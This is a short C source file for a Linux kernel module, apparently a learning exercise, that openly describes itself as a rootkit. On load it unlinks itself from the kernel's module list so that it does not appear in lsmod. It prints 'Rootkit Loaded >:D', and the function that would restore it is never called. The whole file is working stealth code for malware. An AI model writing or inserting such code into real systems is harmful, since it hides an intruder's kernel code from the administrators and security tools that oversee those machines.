
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Samuel Zurowski");
MODULE_DESCRIPTION("Hiding LKMs");
MODULE_VERSION("0.01");


// list_head is doubly-linked list used by kernel.
// has .prev and .next fields. we can use list_del() and list_add() functions
// to add or remove items from this structure

static struct list_head *prev_module;
static short hidden = 0;


void showme(void) {
	list_add(&THIS_MODULE->list, prev_module);
	hidden = 0;
}

void hideme(void) {

	// save the module in the list before us so we can add ourselves back
	prev_module = THIS_MODULE->list.prev;

	// this is how we remove ourself from the list!
	list_del(&THIS_MODULE->list);

}

static int __init rootkit_init(void) {
	printk(KERN_INFO "Rootkit Loaded >:D\n");
	hideme();
	return 0;
}


static void __exit rootkit_exit(void) {
	printk(KERN_INFO "Goodbye, World!\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
